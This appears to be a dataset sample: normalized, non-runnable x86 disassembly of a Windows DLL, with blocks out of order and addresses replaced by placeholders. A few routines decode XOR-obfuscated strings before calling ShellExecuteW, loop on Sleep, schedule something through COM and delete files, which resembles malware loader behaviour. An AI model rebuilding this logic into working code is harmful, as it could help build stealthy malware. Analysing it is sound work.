cmp [ ebp + 0x11 ] 0x2c
je r-xdata
lea ecx [ ebp + 0xc ]
call sub_10045d3b
cmp [ ebp - 0x4 ] 0x1
jne r-xdata
mov edi [ ebp + 0x24 ]
add edi 0x10
push edi
push 0xc
push 0x1
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push ebx
call sub_1001f0b8
or [ esi ] eax
add esp 0x18
dec [ edi ]
jmp r-xdata
cmp [ ebp + 0x11 ] 0x20
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_10045d3b
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_100463af
test al al
je r-xdata
cmp [ ebp + 0x10 ] al
jne r-xdata
cmp [ ebp - 0x4 ] 0x2
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
push [ ebp + 0x24 ]
mov eax [ ebx ]
push esi
push [ ebp + 0x1c ]
lea ecx [ ebp - 0xc ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ecx
mov ecx ebx
call [ eax + 0x18 ]
jmp r-xdata
mov eax [ ebp + 0x24 ]
add eax 0xc
push eax
push 0x1f
push 0x1
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push ebx
call sub_1001f0b8
add esp 0x18
or [ esi ] eax
jmp r-xdata
lea ecx [ ebp + 0xc ]
call sub_1005f1e2
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_100463af
test al al
jne r-xdata
cmp [ ebp + 0x11 ] 0x3a
je r-xdata
lea ecx [ ebp + 0xc ]
call sub_10045d3b
push [ ebp + 0x24 ]
mov eax [ ebx ]
push esi
push [ ebp + 0x1c ]
lea ecx [ ebp - 0xc ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ecx
mov ecx ebx
call [ eax + 0x14 ]
cmp [ ebp - 0x4 ] 0x4
mov eax [ ebp - 0xc ]
mov [ ebp + 0xc ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp + 0x10 ] eax
jne r-xdata
or [ esi ] 0x2
jmp r-xdata
cmp [ ebp + 0x11 ] 0x39
jg r-xdata
lea ecx [ ebp + 0xc ]
call sub_10045d3b
cmp [ ebp + 0x11 ] 0x2f
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_10045d3b
mov eax [ ebp - 0xc ]
mov [ ebp + 0xc ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp + 0x10 ] eax
jmp r-xdata
cmp [ ebp + 0x11 ] 0x20
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_10045d3b
or [ esi ] 0x2
jmp r-xdata
cmp [ ebp + 0x10 ] al
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_1005f1e2
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov [ ebp - 0x4 ] 0x3
jmp r-xdata
cmp [ ebp - 0x4 ] 0x1
je r-xdata
jmp r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_100463af
test al al
je r-xdata
cmp [ ebp + 0x11 ] 0x30
jl r-xdata
lea ecx [ ebp + 0xc ]
call sub_10045d3b
cmp [ ebp + 0x11 ] 0x2c
je r-xdata
lea ecx [ ebp + 0xc ]
call sub_10045d3b
mov edi [ ebp + 0x24 ]
add edi 0x10
push edi
push 0xc
push 0x1
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push ebx
call sub_1001f0b8
or [ esi ] eax
add esp 0x18
dec [ edi ]
jmp r-xdata
cmp [ ebp - 0x4 ] 0x3
je r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
pop edi
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
pop esi
mov [ eax + 0x4 ] ecx
pop ebx
leave
retn 0x20
or [ esi ] 0x1
cmp [ ebp - 0x4 ] 0x4
je r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov eax [ ebp + 0x24 ]
add eax 0xc
push eax
push 0x1f
push 0x1
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push ebx
call sub_1001f0b8
add esp 0x18
or [ esi ] eax
jmp r-xdata
push [ ebp + 0x24 ]
mov eax [ ebx ]
push esi
push [ ebp + 0x1c ]
lea ecx [ ebp - 0xc ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ecx
mov ecx ebx
call [ eax + 0x14 ]
cmp [ ebp + 0x11 ] 0x39
jg r-xdata
lea ecx [ ebp + 0xc ]
call sub_10045d3b
cmp [ ebp + 0x11 ] 0x2f
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_10045d3b
cmp [ ebp - 0x4 ] 0x4
jne r-xdata
jmp r-xdata
cmp [ ebp - 0x4 ] 0x3
jne r-xdata
mov edi [ ebp + 0x24 ]
add edi 0x10
push edi
push 0xc
push 0x1
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push ebx
call sub_1001f0b8
or [ esi ] eax
add esp 0x18
dec [ edi ]
jmp r-xdata
push [ ebp + 0x24 ]
mov eax [ ebx ]
push esi
push [ ebp + 0x1c ]
lea ecx [ ebp - 0xc ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ecx
mov ecx ebx
call [ eax + 0x18 ]
jmp r-xdata
mov eax [ ebp + 0x24 ]
add eax 0xc
push eax
push 0x1f
push 0x1
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push ebx
call sub_1001f0b8
add esp 0x18
or [ esi ] eax
jmp r-xdata
mov eax [ ebp - 0xc ]
mov [ ebp + 0xc ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp + 0x10 ] eax
sub_10038320
push ebp
mov ebp esp
push 0xffffffff
push sub_10086e20
mov eax [ fs : 0x0 ]
push eax
sub esp 0x14
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
cmp eax ecx
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
sub ecx 0x1c
cmp eax ecx
je r-xdata
mov ebx [ eax + 0xc ]
mov edx [ eax ]
mov esi [ eax + 0x4 ]
mov edi [ eax + 0x8 ]
mov [ ebp - 0x14 ] ebx
mov ebx [ ecx ]
mov [ eax ] ebx
mov ebx [ ecx + 0x4 ]
mov [ eax + 0x4 ] ebx
mov ebx [ ecx + 0x8 ]
mov [ eax + 0x8 ] ebx
mov ebx [ ecx + 0xc ]
mov [ eax + 0xc ] ebx
mov [ ecx ] edx
mov edx [ ebp - 0x14 ]
mov [ ecx + 0x4 ] esi
mov [ ecx + 0x8 ] edi
mov [ ecx + 0xc ] edx
mov edx [ eax + 0x10 ]
mov esi [ ecx + 0x10 ]
mov [ eax + 0x10 ] esi
mov [ ecx + 0x10 ] edx
mov edx [ eax + 0x14 ]
mov esi [ ecx + 0x14 ]
mov [ eax + 0x14 ] esi
add eax 0x1c
mov [ ecx + 0x14 ] edx
cmp eax ecx
jne r-xdata
sub_100383c6
mov edi edi
push ebp
mov ebp esp
push ecx
push 0x0
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0x10 ]
push 0x40
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1005dcf4
add esp 0x18
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
leave
retn
or eax 0xffffffff
leave
retn
sub_100383f3
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov eax [ eax ]
cmp eax 0xe0434352
je r-xdata
call sub_10044649
cmp [ eax + 0x90 ] 0x0
jle r-xdata
cmp eax 0xe0434f4d
je r-xdata
xor eax eax
pop ebp
retn
call sub_10044649
dec [ eax + 0x90 ]
cmp eax 0xe06d7363
jne r-xdata
call sub_10044649
and [ eax + 0x90 ] 0x0
jmp sub_1004cfe6
sub_10038442
push 0x14
mov eax sub_100854e5
call sub_100624bc
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_10034e98
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_100389e0
mov ecx [ ebp + 0x8 ]
push eax
call sub_100014d0
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_10069747
mov eax edi
call sub_10013ab8
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_1003bf29
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10029420
push edi
call sub_10062b65
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_1002c57b
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_10024fe9
sub_100384df
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_100649b6
test [ ebp + 0x8 ] 0x1
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_100187af
pop ecx
sub_10038510
push ebp
mov ebp esp
push ecx
mov edx [ ebp + 0xc ]
cmp [ edx + 0x14 ] 0x10
mov [ ebp - 0x4 ] 0x0
jb r-xdata
mov eax edx
mov eax [ edx ]
jmp r-xdata
mov edx [ edx + 0x10 ]
push esi
mov esi [ ebp + 0x8 ]
add edx eax
push edx
push eax
push esi
call sub_1001b000
mov eax esi
pop esi
mov esp ebp
pop ebp
retn 0x8
sub_10038550
push ebp
mov ebp esp
sub esp 0x28
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x14 ] 0x6
je r-xdata
mov ecx [ eax + 0x38 ]
mov [ esi ] ecx
mov eax [ eax + 0x3c ]
lea edx [ ebp - 0x28 ]
mov eax 0x86
call sub_10053240
push 0x4
push 0x0
mov [ esi ] 0x0
mov [ esi + 0x4 ] 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
mov [ eax ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov [ esi + 0x4 ] eax
inc [ eax ]
xor ecx ebp
mov eax esi
call sub_10001e8b
mov esp ebp
pop ebp
retn 0x4
sub_100385c3
mov edi edi
push ebp
mov ebp esp
xor eax eax
cmp [ rw-data ] eax
jne r-xdata
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10055589
add esp 0xc
pop ebp
retn
cmp [ ebp + 0x8 ] eax
jne r-xdata
cmp [ ebp + 0xc ] eax
je r-xdata
call sub_1006299d
mov [ eax ] 0x16
call sub_100427ff
mov eax 0x7fffffff
pop ebp
retn
pop ebp
jmp sub_100136d5
sub_1003860a
mov edi edi
push esi
call sub_10053997
mov esi eax
push esi
call sub_100121ef
push esi
call sub_100109c5
push esi
call sub_1005da17
push esi
call sub_10018d27
push esi
call sub_10044a0b
push esi
call sub_10025100
add esp 0x18
pop esi
retn
sub_10038640
push ebp
mov ebp esp
call sub_1004e700
test eax eax
jne r-xdata
call [ ebp + 0x8 ]
pop ebp
retn 0x4
push esi
mov esi [ Sleep@IAT ]
push 0x2710
call esi
call sub_1004e700
test eax eax
je r-xdata
pop esi
sub_10038670
push ebp
mov ebp esp
sub esp 0x440
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov ecx [ r--data ]
push ebx
xor eax eax
push esi
lea ecx [ ecx ]
movsx esi [ ecx + eax ]
xor esi eax
xor esi 0x7f
and esi 0xff
mov [ ebp + eax * 2 - 0x30 ] si
inc eax
cmp eax 0x11
jb r-xdata
push edx
lea ecx [ ebp - 0x30 ]
xor eax eax
push ecx
mov ecx 0x104
lea ebx [ ebp - 0x238 ]
mov [ ebp - 0xe ] ax
call sub_1002cb70
mov ecx [ r--data ]
add esp 0x8
pop esi
xor eax eax
pop ebx
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xffaf
and edx 0xff
mov [ ebp + eax * 2 - 0xc ] dx
inc eax
cmp eax 0x3
jb r-xdata
push 0x104
lea ecx [ ebp - 0x440 ]
push ecx
lea edx [ ebp - 0xc ]
xor eax eax
push edx
mov [ ebp - 0x6 ] ax
call [ GetEnvironmentVariableW@IAT ]
push 0x0
push 0x0
lea eax [ ebp - 0x238 ]
push eax
lea ecx [ ebp - 0xc ]
push ecx
push 0x0
push 0x0
call [ ShellExecuteW@IAT ]
mov ecx [ ebp - 0x4 ]
xor edx edx
cmp eax 0x20
setg dl
xor ecx ebp
mov eax edx
call sub_10001e8b
mov esp ebp
pop ebp
retn
sub_1003873c
mov edi edi
push ebp
mov ebp esp
add ecx 0x8
push ecx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10024740
add esp 0x14
pop ebp
retn 0x10
sub_10038760
push ebp
mov ebp esp
push ecx
test esi esi
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x1c ]
lea edx [ ebp - 0x4 ]
push edx
mov edx [ ebp + 0x10 ]
mov [ ebp - 0x4 ] 0x0
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0xd4 ]
call eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
mov edx [ ecx + 0x6c ]
push esi
push eax
call edx
mov eax [ ebp + 0xc ]
mov eax [ eax ]
lea edx [ ebp + 0x8 ]
push edx
mov edx [ ebp - 0x4 ]
mov [ ebp + 0x8 ] 0x0
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x20 ]
call eax
test eax eax
js r-xdata
lea eax [ esi + 0x2 ]
mov esp ebp
pop ebp
retn 0xc
mov eax 0x1
mov esp ebp
pop ebp
retn 0xc
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov eax [ ebp - 0x4 ]
mov [ ebp + 0x8 ] 0x0
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
xor eax eax
mov esp ebp
pop ebp
retn 0xc
sub_10038800
push ebp
mov ebp esp
push ecx
push 0xffffffff
push 0x0
push eax
mov [ ebp - 0x4 ] 0x0
call sub_10017b50
xor ecx ecx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
mov [ esi ] cx
push eax
mov ecx esi
call sub_100649e0
mov eax esi
mov esp ebp
pop ebp
retn
sub_10038848
mov edi edi
push ebp
mov ebp esp
sub esp 0x4c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x14 ]
mov eax [ esi + 0x14 ]
push edi
push [ ebp + 0x1c ]
mov edi [ ebp + 0x8 ]
push eax
push r--data
lea eax [ ebp - 0xc ]
mov ebx ecx
push eax
push ebx
call sub_1005efca
add esp 0x10
push eax
lea eax [ ebp - 0x4c ]
push 0x40
push eax
call sub_1005c1c5
push eax
lea eax [ ebp - 0x4c ]
push eax
push [ ebp + 0x18 ]
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edi
push ebx
call sub_1004883d
mov ecx [ ebp - 0x4 ]
add esp 0x30
mov eax edi
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10001e8b
leave
retn 0x18
sub_100388f0
push ebp
mov ebp esp
sub esp 0x50
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ esi + 0x8 ]
mov ecx [ eax ]
lea edx [ ebp - 0x48 ]
push edx
lea edx [ ebp - 0x4c ]
push edx
push eax
mov eax [ ecx + 0xc ]
call eax
mov [ esi ] eax
test eax eax
jns r-xdata
push 0x30
lea eax [ ebp - 0x44 ]
push 0x0
push eax
call sub_1007f940
add esp 0xc
lea ecx [ ebp - 0x14 ]
push ecx
call [ GetLocalTime@IAT ]
movzx eax [ ebp - 0x12 ]
mov cx [ ebp - 0x14 ]
mov dx [ ebp - 0xe ]
mov [ ebp - 0x40 ] cx
mov ecx [ ebp - 0xa ]
mov [ ebp - 0x3e ] ax
movzx eax [ ebp - 0xc ]
mov [ ebp - 0x3c ] dx
add ecx 0x2
mov [ ebp - 0x34 ] ax
mov eax [ ebp - 0x48 ]
mov [ ebp - 0x32 ] cx
mov edx 0x30
mov [ ebp - 0x44 ] dx
lea ecx [ ebp - 0x44 ]
mov [ ebp - 0x24 ] 0x7
mov edx [ eax ]
mov edx [ edx + 0xc ]
push ecx
push eax
call edx
mov [ esi ] eax
test eax eax
jns r-xdata
mov eax [ esi + 0x8 ]
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
mov eax [ esi + 0x8 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov eax [ ebp - 0x48 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
call [ CoUninitialize@IAT ]
mov eax [ esi ]
sub_100389b3
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10021693
add esp 0x18
pop ebp
retn
sub_100389e0
push ebp
mov ebp esp
push ecx
push esi
mov esi ecx
cmp [ esi ] 0x0
jne r-xdata
mov eax [ esi ]
pop esi
mov esp ebp
pop ebp
retn
push 0x0
lea ecx [ ebp - 0x4 ]
call sub_10034e98
cmp [ esi ] 0x0
jne r-xdata
lea ecx [ ebp - 0x4 ]
call sub_10069747
mov eax [ rw-data ]
inc eax
mov [ rw-data ] eax
mov [ esi ] eax
sub_10038a17
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
push esi
push [ ebp + 0xc ]
lea ecx [ ebp - 0x18 ]
call sub_1001da0a
mov ebx [ ebp + 0x8 ]
mov esi 0x100
cmp ebx esi
jae r-xdata
mov eax [ ebp - 0x18 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov ecx [ ebp - 0x18 ]
cmp [ ecx + 0xac ] 0x1
jle r-xdata
call sub_1006299d
mov [ eax ] 0x2a
xor ecx ecx
mov [ ebp - 0x4 ] bl
mov [ ebp - 0x3 ] 0x0
inc ecx
mov [ ebp + 0x8 ] ebx
sar [ ebp + 0x8 ] 0x8
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
and eax 0xff
push eax
call sub_10007b46
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ecx + 0xc8 ]
movzx eax [ eax + ebx * 2 ]
and eax 0x1
lea eax [ ebp - 0x18 ]
push eax
push 0x1
push ebx
call sub_100079d1
mov ecx [ ebp - 0x18 ]
add esp 0xc
jmp r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
cmp eax 0x1
movzx eax [ ebp - 0x8 ]
je r-xdata
mov al [ ebp + 0x8 ]
push 0x2
mov [ ebp - 0x4 ] al
mov [ ebp - 0x3 ] bl
mov [ ebp - 0x2 ] 0x0
pop ecx
jmp r-xdata
mov eax [ ecx + 0xcc ]
movzx eax [ eax + ebx ]
jmp r-xdata
test eax eax
je r-xdata
mov eax ebx
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebp - 0xc ] 0x0
je r-xdata
movzx ecx [ ebp - 0x7 ]
shl eax 0x8
or eax ecx
mov eax [ ebp - 0x18 ]
push 0x1
push [ eax + 0x4 ]
lea edx [ ebp - 0x8 ]
push 0x3
push edx
push ecx
lea ecx [ ebp - 0x4 ]
push ecx
push esi
push [ eax + 0x14 ]
lea eax [ ebp - 0x18 ]
push eax
call sub_1006e5c0
add esp 0x24
test eax eax
je r-xdata
pop esi
pop ebx
leave
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_10038b4c
mov edi edi
push ebp
mov ebp esp
push [ ecx + 0xc ]
lea eax [ ebp + 0x14 ]
push 0x0
push eax
lea eax [ ebp + 0xc ]
push eax
call sub_1000723f
add esp 0x10
test eax eax
jns r-xdata
mov ecx [ ebp + 0x24 ]
sar eax 0x1
mov [ ecx + 0x10 ] eax
mov eax [ ebp + 0x20 ]
or [ eax ] 0x2
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
pop ebp
retn 0x20
sub_10038c00
push ebp
mov ebp esp
push 0xffffffff
push sub_1008a2ac
mov eax [ fs : 0x0 ]
push eax
sub esp 0x4f8
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x14 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
xor ebx ebx
mov edi ecx
mov esi edx
mov [ ebp - 0x4a0 ] eax
mov [ ebp - 0x498 ] ebx
mov [ ebp - 0x494 ] ebx
mov [ ebp - 0x490 ] ebx
mov [ ebp - 0x4 ] ebx
xor ecx ecx
mov [ ebp - 0x468 ] 0x7
mov [ ebp - 0x46c ] ebx
mov [ ebp - 0x47c ] cx
mov [ ebp - 0x460 ] ebx
mov [ ebp - 0x45c ] ebx
lea edx [ ebp - 0x4a8 ]
mov [ ebp - 0x4 ] 0x1
push edx
mov [ ebp - 0x484 ] ebx
call [ GetSystemTimeAsFileTime@IAT ]
mov eax [ r--data ]
movsx ecx [ eax ]
xor ecx 0x4e
and ecx 0xff
lea eax [ ebp - 0x488 ]
push eax
xor edx edx
mov [ ebp - 0x488 ] cx
mov ecx eax
push ecx
mov [ ebp - 0x486 ] dx
mov edx eax
mov eax [ rw-data ]
push edx
push 0x1
push 0x1
push eax
lea eax [ ebp - 0x43c ]
call sub_10066ff0
test eax eax
je r-xdata
lea eax [ ebp - 0x43c ]
lea edx [ eax + 0x2 ]
cmp [ ebp - 0x468 ] 0x8
jb r-xdata
mov cx [ eax ]
add eax 0x2
cmp cx bx
jne r-xdata
sub eax edx
sar eax 0x1
push eax
lea edx [ ebp - 0x43c ]
push edx
lea ecx [ ebp - 0x47c ]
call sub_1005ddc0
push edi
mov [ ebp - 0x460 ] edi
call [ lstrlenW@IAT ]
lea eax [ eax + eax + 0x2 ]
lea ecx [ ebp - 0x47c ]
lea edi [ ebp - 0x498 ]
mov [ ebp - 0x45c ] eax
call sub_10048ba0
lea edx [ ebp - 0x28 ]
mov eax 0x62
call sub_10045930
push ebx
push r--data
push ebx
push ebx
push r--data
push ebx
push ebx
push ebx
push ebx
push r--data
mov ecx edx
mov edx [ ebp - 0x4a0 ]
push ecx
push ebx
push edx
push ebx
push r--data
push esi
xor edx edx
xor ecx ecx
lea esi [ ebp - 0x504 ]
call sub_10051fc0
mov eax esi
push eax
lea edi [ ebp - 0x43c ]
call sub_10057600
mov edi 0x7
xor ecx ecx
mov [ ebp - 0x480 ] ebx
mov [ ebp - 0x49c ] ebx
mov [ ebp - 0x444 ] edi
mov [ ebp - 0x448 ] ebx
mov [ ebp - 0x458 ] cx
lea edx [ ebp - 0x458 ]
mov ecx esi
mov [ ebp - 0x4 ] 0x3
call sub_10027fc0
test eax eax
je r-xdata
mov eax 0x1
jmp r-xdata
mov ecx [ ebp - 0x47c ]
push ecx
call sub_100187af
add esp 0x4
lea eax [ ebp - 0x480 ]
push eax
lea ecx [ ebp - 0x498 ]
push ecx
lea ecx [ ebp - 0x49c ]
lea edx [ ebp - 0x458 ]
call sub_10003c30
test eax eax
je r-xdata
mov esi 0x8
cmp [ ebp - 0x444 ] esi
jb r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x49c ]
cmp eax 0x1e84800
jge r-xdata
mov [ ebp - 0x484 ] 0x3
jmp r-xdata
xor eax eax
mov [ ebp - 0x458 ] ax
lea eax [ ebp - 0x504 ]
mov [ ebp - 0x444 ] edi
mov [ ebp - 0x448 ] ebx
mov [ ebp - 0x4 ] 0x1
call sub_1001f5f0
cmp [ ebp - 0x468 ] esi
jb r-xdata
mov edx [ ebp - 0x458 ]
push edx
call sub_100187af
add esp 0x4
lea edx [ ebp - 0x484 ]
mov eax 0x46
call sub_10045930
mov eax edx
push eax
mov eax [ rw-data ]
mov ecx edx
push ecx
push edx
push 0x1
push 0x1
push eax
lea eax [ ebp - 0x234 ]
mov [ ebp - 0x488 ] 0x1
call sub_10066ff0
test eax eax
jne r-xdata
mov edx [ ebp - 0x480 ]
push ebx
push eax
mov eax [ rw-data ]
push edx
push eax
xor edx edx
xor ecx ecx
call sub_1005c3d0
test eax eax
je r-xdata
mov edi [ ebp - 0x498 ]
mov esi [ HeapFree@IAT ]
cmp edi [ ebp - 0x494 ]
je r-xdata
mov esi [ ebp - 0x498 ]
xor edx edx
mov [ ebp - 0x468 ] edi
mov [ ebp - 0x46c ] ebx
mov [ ebp - 0x47c ] dx
cmp esi ebx
je r-xdata
mov ecx [ ebp - 0x47c ]
push ecx
call sub_100187af
add esp 0x4
mov edi [ ebp - 0x498 ]
mov esi [ HeapFree@IAT ]
cmp edi [ ebp - 0x494 ]
je r-xdata
mov ecx [ ebp - 0x49c ]
mov edx [ ebp - 0x480 ]
push ecx
push edx
lea eax [ ebp - 0x234 ]
call sub_10005c30
add esp 0x8
mov [ ebp - 0x488 ] eax
mov [ ebp - 0x484 ] 0x4
mov eax [ ebp - 0x480 ]
cmp eax ebx
je r-xdata
jmp r-xdata
mov eax 0x2
jmp r-xdata
mov edi [ ebp - 0x494 ]
mov eax esi
call sub_100699f0
push esi
call sub_100187af
add esp 0x4
mov eax [ ebp - 0x480 ]
cmp eax ebx
je r-xdata
mov eax [ edi + 0x1c ]
push eax
push ebx
call [ GetProcessHeap@IAT ]
push eax
call esi
add edi 0x24
cmp edi [ ebp - 0x494 ]
jne r-xdata
mov esi 0x8
cmp [ ebp - 0x444 ] esi
jb r-xdata
push eax
push ebx
call [ GetProcessHeap@IAT ]
push eax
call esi
mov [ ebp - 0x480 ] ebx
mov ecx [ edi + 0x1c ]
push ecx
push ebx
call [ GetProcessHeap@IAT ]
push eax
call esi
add edi 0x24
cmp edi [ ebp - 0x494 ]
jne r-xdata
cmp [ ebp - 0x488 ] ebx
je r-xdata
push eax
push ebx
call [ GetProcessHeap@IAT ]
push eax
call esi
mov [ ebp - 0x480 ] ebx
xor eax eax
mov [ ebp - 0x458 ] ax
mov edi 0x7
lea eax [ ebp - 0x504 ]
mov [ ebp - 0x444 ] edi
mov [ ebp - 0x448 ] ebx
mov [ ebp - 0x4 ] 0x1
call sub_1001f5f0
cmp [ ebp - 0x468 ] esi
jb r-xdata
mov edx [ ebp - 0x458 ]
push edx
call sub_100187af
add esp 0x4
lea edx [ ebp - 0x234 ]
push edx
call sub_1004cc40
cmp eax ebx
je r-xdata
mov esi 0x8
cmp [ ebp - 0x444 ] esi
jb r-xdata
mov esi [ ebp - 0x498 ]
xor edx edx
mov [ ebp - 0x468 ] edi
mov [ ebp - 0x46c ] ebx
mov [ ebp - 0x47c ] dx
cmp esi ebx
je r-xdata
mov ecx [ ebp - 0x47c ]
push ecx
call sub_100187af
add esp 0x4
lea edx [ ebp - 0x234 ]
push edx
call [ DeleteFileW@IAT ]
mov esi 0x8
cmp [ ebp - 0x444 ] esi
jb r-xdata
lea eax [ ebp - 0x234 ]
push eax
call [ DeleteFileW@IAT ]
mov esi 0x8
cmp [ ebp - 0x444 ] esi
jb r-xdata
xor edx edx
mov edi 0x7
lea eax [ ebp - 0x504 ]
mov [ ebp - 0x444 ] edi
mov [ ebp - 0x448 ] ebx
mov [ ebp - 0x458 ] dx
mov [ ebp - 0x4 ] 0x1
call sub_1001f5f0
cmp [ ebp - 0x468 ] esi
jb r-xdata
mov ecx [ ebp - 0x458 ]
push ecx
call sub_100187af
add esp 0x4
mov eax [ ebp - 0x484 ]
jmp r-xdata
mov edi [ ebp - 0x494 ]
mov eax esi
call sub_100699f0
push esi
call sub_100187af
add esp 0x4
xor ecx ecx
mov edi 0x7
lea eax [ ebp - 0x504 ]
mov [ ebp - 0x444 ] edi
mov [ ebp - 0x448 ] ebx
mov [ ebp - 0x458 ] cx
mov [ ebp - 0x4 ] 0x1
call sub_1001f5f0
cmp [ ebp - 0x468 ] esi
jb r-xdata
mov eax [ ebp - 0x458 ]
push eax
call sub_100187af
add esp 0x4
xor edx edx
mov edi 0x7
lea eax [ ebp - 0x504 ]
mov [ ebp - 0x444 ] edi
mov [ ebp - 0x448 ] ebx
mov [ ebp - 0x458 ] dx
mov [ ebp - 0x4 ] 0x1
call sub_1001f5f0
cmp [ ebp - 0x468 ] esi
jb r-xdata
